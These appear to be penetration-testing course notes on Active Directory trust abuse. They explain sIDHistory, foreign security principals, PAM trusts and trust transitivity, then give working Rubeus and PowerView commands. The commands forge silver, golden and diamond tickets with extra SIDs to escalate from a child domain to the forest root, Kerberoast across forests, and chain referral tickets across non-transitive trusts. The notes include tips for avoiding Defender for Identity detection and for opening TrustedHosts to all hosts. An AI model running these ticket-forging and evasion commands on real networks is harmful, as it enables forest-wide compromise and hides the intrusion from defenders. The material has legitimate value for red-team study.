# Trust

## Theory

### SIDHistory

sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.

sIDHistory can be abused in two ways of escalating privileges within a forest:

* krbtgt hash of the child
* Trust tickets

{% hint style="info" %}
This is not a configutation and cannot be fixed because it works as intended!
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Foreign Security Principals

A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).

Only SID of a FSP is stored in the Foreign Security Principal Container which can be resolved using the trust relationship. FSP allows external principals to be added to domain local security groups. Thus, allowing such principals to access resources in the forest.

Often, FSPs are ignored, mis-configured or too complex to change/cleanup in an enterprise making them ripe for abuse.

### ALCs

Access to resources in a forest trust can also be provided without using FSPs using ACLs.

Principals added to ACLs do NOT show up in the ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group.

### PAM Trust

PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages.

PAM trust provides the ability to access the production forest with high privileges without using credentials of the bastion forest. Thus, better security for the bastion forest which is much desired.

To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.

### Trusting to Trusted

We can use the trust account to access resources from a trusting forests to the trusted forest (opposite to direction of access). This is possible if the trusting domains trust key account is member the Domain Users group in the trusted domain.

{% hint style="info" %}
Note that this is a default setting.
{% endhint %}

### Trust Transitivity

A Bidirectional non-transitive External trust can be abused by an account in a trusted forest to authenticate against any domain within a trusting forest.

A non-transitive external trust can be made transitive to compromise the trusting forest bypassing the principal of non-transitivity.

1. Request a referral TGT as intended from controlled domain to middle domain (external bidirectional trust)
2. Request a "local" TGT for middle domain (service realm - target domain) since direct access from controlled domain to target domain isn't allowed.
3. Use the local TGT again to gain another referral TGT for target domain from middle domain (bidirectional child to forest trust).
4. Finally, use the resultant referral TGT to gain a TGS for a target service target domain.

## Abuse Child to Forest Root

### Using the trust key

After dumping the trust key forge a silver ticket

{% code overflow="wrap" %}
```powershell
./Rubeus.exe silver /user:Administrator /ldap /service:krbtgt/<$Domain> /rc4:<$Trust Key>/sids:<$Extra SIDs> /nowrap
```
{% endcode %}

And use it

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgs /service:<$Service> /dc:<$DC> /ptt /ticket:<$Ticket>
```
{% endcode %}

### Using the krbtgt hash - Golden

After dumping the krbtgt hash of the child domain a golden ticket can be forged

{% hint style="info" %}
For extra SIDs:

* -519 is enterprise admin
{% endhint %}

{% code overflow="wrap" %}
```powershell
./Rubeus.exe golden /user:Administrator /id:500 /domain:<$Child domain> /sid:>$Child SID> /groups:513 /aes256:<$aes>/sids:<$Extra SIDs> /ptt
```
{% endcode %}

And you can now enter the session with the ticket

{% hint style="warning" %}
Using the machine account instead of the administrator one to forge the ticket will avoid suspicious loggin from the MDI
{% endhint %}

{% hint style="info" %}
For extra SIDs:

* -516 is Domain Controller
* -512 if it's another child (not forest root)
* S-1-5-9 is Enterprise Domain Controller
{% endhint %}

{% code overflow="wrap" %}
```powershell
./Rubeus.exe golden /user:<dc$> /id:1000 /domain:<$Child domain> /sid:>$Child SID> /groups:513 /aes256:<$aes>/sids:<$Extra SIDs> /ptt
```
{% endcode %}

### Using the krbtgt hash - Diamond

A diamond inter-realm ticket will avoid suspicious logs and bypass MDI in the child and parent domain, even more than DCSync from machine account

{% code overflow="wrap" %}
```powershell
./Rubeus.exe diamond /krbkey:<$krbtgt aes> /tgtdeleg /enctype:aes /ticketuser:<$DC machine account> /domain:<$Child> /dc:<$DC> /ticketuserid:1000 /sids:<$Extra SIDs> /createonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

## Abuse Cross Forest

### Kerberoast

It's possible to execute kerberoast across Forest Trusts.

To enumerate service account across forest using powerview:

{% code overflow="wrap" %}
```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
```
{% endcode %}

And Kerberoast the found account

{% code overflow="wrap" %}
```powershell
./Rubeus.exe kerberoast /user:<$Found User> /simple /domain:<Domain> /outfile:hash.txt
```
{% endcode %}

Crack it and request a TGT across the trust:

{% code overflow="wrap" %}
```powershell
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <$Account>/<$Machine>@<$Domain>
```
{% endcode %}

### Foreign Security Principals (FSP)

To enumerate with powerview

```powershell
 Find-ForeignGroup -Verbose
 Find-ForeignUser -Verbose 
```

With AD-Module

{% code overflow="wrap" %}
```powershell
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server <$Server>
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

to check the SID

```powershell
Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq '<$Found SID>'}
```

To find out which group it is a member of, run the below command:

{% code overflow="wrap" %}
```powershell
Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
```
{% endcode %}

### ACLs

To enumerate with powerview

```powershell
 Find-InterestingDomainAcl -Domain <$Target Domain>
```

### PAM

Check for any Shadow Principal

{% code overflow="wrap" %}
```powershell
$PSSession= New-PSSession <$Controlled dc> 
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $PSSession
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get ADRootDSE).configurationNamingContext) -Filter * -Properties | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $PSSession
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
If we try to access production.local from the session on bastion.local using techcorp Administrator we will face the double hop issue, so we need to use Overpass-the-hash Administrator of bastion.local.
{% endhint %}

Now connect to the found target with ps session

{% hint style="danger" %}
To use PowerShell Remoting to connect to an IP address, we must modify the WSMan Trustedhosts property on the student VM.

```
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
```

To connect to an ip address you need the NTLM hash and not aes&#x20;
{% endhint %}

```powershell
 Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential 
```

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Trusting to Trusted - Trust Key

On production-dc begin by extracting the trust key \[out] for target dc. We can also use any of the  tools / methods to extract trust keys.

Use the trust key to get a usable TGT as a Domain User (Trust account $) in the target domain domain using Rubeus.

Finally, access a resource in thetarget domain domain abusing Domain User rights.

### Trust Transitivity

First request a TGT for the middle domain

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgs /service:krbtgt/<$Middle domain> /dc:<$Controlled dc>  /nowrap /ticket:<$Ticket of the controlled domain administrator>
```
{% endcode %}

Now use the above referral TGT to gain a “local” TGT for the middle domain

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgs /service:krbtgt/<$Middle domain> /dc:<$Middle DC> /targetdomain:<$MiddleDomain> /nowrap /ticket:<$referral TGT from above> 
```
{% endcode %}

Using the “local” TGT now request another referral TGT for target domain

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgs /service:krbtgt/<$Target Domain> /dc:<$Middle DC> /targetdomain:<$Middle Domain> /nowrap /ticket:<“local” TGT> 
```
{% endcode %}

Finally, request a usable TGS to gain access onto any target service (CIFS in this case)

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgs /service:cifs/<$Target DC> /dc:<$Target DC> /nowrap /ptt /ticket:<referral TGT from above>
```
{% endcode %}

## References

{% embed url="https://blog.improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted" %}

{% embed url="https://exploit.ph/external-trusts-are-evil.html" %}
